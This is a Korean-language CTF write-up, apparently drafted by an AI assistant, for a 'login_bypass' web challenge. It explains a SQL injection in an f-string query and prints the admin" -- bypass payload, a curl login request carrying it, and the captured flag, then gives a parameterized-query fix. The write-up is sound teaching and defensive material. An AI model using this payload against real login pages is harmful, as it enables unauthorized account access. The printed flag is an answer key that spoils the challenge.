````markdown
## login_bypass

> 문제 설명: 로그인 페이지에서 userid, userpassword를 입력받아 DB에서 조회 후, admin으로 로그인 성공 시 화면에 flag가 출력되는 웹 문제입니다.

### **SQL Injection 취약점**

서버 코드(`app.py`)에서 사용자 입력값을 검증 없이 f-string으로 SQL 쿼리에 직접 삽입하고 있습니다.

```python
res = query_db(f'select * from users where userid="{userid}" and userpassword="{userpassword}"')
```
````

`userid`에 SQL 구문을 주입하면 쿼리 자체를 조작할 수 있어, 비밀번호를 몰라도 인증을 우회할 수 있습니다.

#### **동작 원리**

- `userid` 입력값에 `admin" --` 를 넣으면 쿼리가 다음과 같이 변합니다.
  ```sql
  select * from users where userid="admin" --" and userpassword="아무값"
  ```
- SQLite에서 `--`는 한 줄 주석이므로 이후의 `userpassword` 조건은 전부 무시됩니다.
- 결과적으로 `userid="admin"` 조건만 남아, 비밀번호 검증 없이 admin row가 조회됩니다.

### Solve 😈

**userid:**

```
admin" --
```

**userpassword:** (아무 값, 공백도 가능)

```bash
curl -X POST http://host:port/login \
     -d 'userid=admin" --&userpassword=x'
```

**결과:**

```
hello admin flag is DH{c1126c8d35d8deaa39c5dd6fc8855ed0}
```

### 근본 원인 및 방어법

- **원인**: 사용자 입력을 문자열 포매팅으로 쿼리에 직접 삽입 (f-string SQL 구성)
- **방어법**: Parameterized Query(Prepared Statement) 사용
  ```python
  cur = db.execute("select * from users where userid=? and userpassword=?", (userid, userpassword))
  ```

```

필요하면 CTF 분류 표(문제명/난이도/카테고리) 같은 요소도 추가해서 좀 더 포맷을 맞출 수 있어요. 더 다듬을 부분 있으면 말해줘요.
```
